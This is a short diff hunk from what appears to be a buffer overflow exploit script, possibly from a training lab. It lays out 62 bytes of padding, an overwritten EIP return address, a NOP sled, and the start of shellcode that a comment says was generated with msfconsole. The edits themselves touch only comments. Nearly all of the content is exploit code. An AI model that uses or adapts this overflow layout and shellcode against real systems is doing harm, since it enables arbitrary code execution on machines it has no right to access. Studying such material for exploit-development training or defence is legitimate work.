@@ -9,13 +9,13 @@ ________________________________________________________________________________
     buffer = "A" * 62
     
     #eip = "BBBB"
-    eip = "\x59\x3b\xde\xf7"
+    #eip = "\x59\x3b\xde\xf7"
     
     nop = '\x90' * 5
     
     buf =  b""                                                            #This is gotten from the msfconsole
     buf += b"\xd9\xc6\xba\x7b\x1d\x43\x22\xd9\x74\x24\xf4\x5e"            #commands that were ran below!!!!!!
-    buf += b"\x31\xc9\xb1\x0b\x83\xc6\x04\x31\x56\x15\x03\x56"
+    buf += b"\x31\xc9\xb1\x0b\x83\xc6\x04\x31\x56\x15\x03\x56"            #this comes later after msfconsole
     buf += b"\x15\x99\xe8\x29\x29\x05\x8a\xfc\x4b\xdd\x81\x63"
     buf += b"\x1d\xfa\xb2\x4c\x6e\x6c\x43\xfb\xbf\x0e\x2a\x95"
     buf += b"\x36\x2d\xfe\x81\x4e\xb1\xff\x51\x26\xd9\x90\x30"
